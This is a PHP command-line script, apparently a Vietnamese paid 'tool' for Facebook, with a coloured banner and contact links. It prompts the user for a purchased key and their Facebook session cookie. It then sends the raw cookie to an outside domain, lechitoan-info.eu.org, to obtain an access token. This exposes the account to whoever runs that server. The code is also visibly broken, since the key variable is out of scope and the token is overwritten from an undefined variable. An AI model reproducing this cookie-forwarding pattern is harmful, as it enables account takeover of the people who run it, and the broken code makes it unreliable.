error_reporting(0);
session_start();
date_default_timezone_set("Asia/Ho_Chi_Minh");
$do="\033[1;91m";
$den="\033[1;33m";
$tim="\033[1;34m";
$luc="\033[1;92m";
$trang="\033[1;97m";
$vang = "\033[1;93m";
$hong = "\033[1;95m";
$xnhac = "\033[1;36m";
$xduong = "\033[1;96m";
/***[ Đánh Dấu Bản Quyền ]***/
$dragonx = $do."[".$trang ."=.=".$do."] ".$trang."=> ";
if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') {
    system('clear');
} else {
    system('cls');
}
/***[ Banner ]***/
$banner = "
\033[1;34m  █████╗ ███╗   ██╗     ██████╗ ██████╗ ██╗███╗   ██╗
\033[1;37m ██╔══██╗████╗  ██║    ██╔═══██╗██╔══██╗██║████╗  ██║
\033[1;34m ███████║██╔██╗ ██║    ██║   ██║██████╔╝██║██╔██╗ ██║
\033[1;37m ██╔══██║██║╚██╗██║    ██║   ██║██╔══██╗██║██║╚██╗██║
\033[1;34m ██║  ██║██║ ╚████║    ╚██████╔╝██║  ██║██║██║ ╚████║
\033[1;37m ╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
\033[1;31m────────────────────────────────────────────────────────────
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;33mTOOL GỘP FRRE
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;35mADMIN: \033[1;36mAN ORIN
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;36mFB: \033[1;31manorintool970
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mBOX SUPPORT: \033[1;37mhttps://zalo.me/g/dpfbxq529
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;34mYOUTUBE: \033[1;37mhttps://youtube.com/@AnOrinTool970
\033[1;31m────────────────────────────────────────────────────────────\n";
/***[ Clear + Thông Số Admin ]***/
if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') { 
    @system('clear'); 
} else { 
    @system('cls'); 
}
for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep(500);}
echo $dragonx."Nhập Key Đã Mua: $vang";
$keytool = trim(fgets(STDIN));
echo $dragonx."Nhập Cookie Facebook : $vang";
$cookie = trim(fgets(STDIN));
$token = laytoken($cookie);
$token = $data['data']['token'];
if ($token == 'die'){
die("\033[1;91mCookie Đã Die Hoặc Bị Văng Khỏi Web\n");
} else {
echo "\033[1;31m────────────────────────────────────────────────────────────\n";
echo $dragonx."Thành Công!\n";
echo "\033[1;31m────────────────────────────────────────────────────────────\n";
echo $dragonx."Token Của Bạn Là : $vang".$token."\n\n";
exit;
}
function laytoken($cookie){
   $get = file_get_contents("https://lechitoan-info.eu.org/api/tk.php?key=$keytool&cookie=".$cookie."&type=EAABw");
   return $get;
}